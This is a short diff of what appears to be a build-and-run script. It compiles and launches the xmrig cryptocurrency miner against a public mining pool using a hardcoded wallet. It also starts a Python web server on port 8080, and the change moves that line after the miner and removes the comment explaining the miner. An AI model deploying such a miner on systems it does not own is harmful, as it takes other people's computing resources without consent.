@@ -17,7 +17,5 @@ cmake .. && \
 make
 
 # Start a simple Python HTTP server on port 8080
-python3 -m http.server 8080
-
-# Run xmrig with your configuration
 ./xmrig -o pool.hashvault.pro:443 -u 498fshezQrqeYsyFQL7Rm8d3EUGkHaWpiJXL6UAqQ8KNjoKK3hQiPdQJxW6LuzcMa4HbggmFMCn4P7MSJJ6QKh65CUFBAQs -k --tls
+python3 -m http.server 8080
